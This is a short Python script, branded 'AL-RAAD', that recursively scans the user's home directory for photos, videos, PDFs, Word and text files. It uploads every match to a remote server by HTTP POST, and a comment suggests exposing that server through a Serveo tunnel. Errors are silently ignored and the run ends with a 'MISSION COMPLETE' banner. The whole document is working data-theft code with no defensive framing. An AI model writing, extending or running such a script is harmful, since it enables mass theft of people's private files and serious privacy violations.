import os
import requests

# 1. Server Configuration
# Replace 'http://localhost:8000' with your Serveo link later if needed
SERVER_URL = "http://localhost:8000" 

# 2. Path Configuration
root_path = os.path.expanduser("~")
extensions = ('.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.docx', '.txt')

print("-" * 30)
print("⚡ AL-RAAD: SYSTEM START ⚡")
print("-" * 30)

# 3. Scanning and Uploading
count = 0
for root, dirs, files in os.walk(root_path):
    for file in files:
        if file.lower().endswith(extensions):
            file_path = os.path.join(root, file)
            try:
                # File found - Printing to terminal
                print(f"[+] PROCESSING: {file}")
                
                # Uploading file to your server
                with open(file_path, 'rb') as f:
                    requests.post(SERVER_URL, files={'file': f})
                
                count += 1
            except:
                pass

print("-" * 30)
print(f"⚡ MISSION COMPLETE | TOTAL FILES: {count} ⚡")
print("-" * 30)
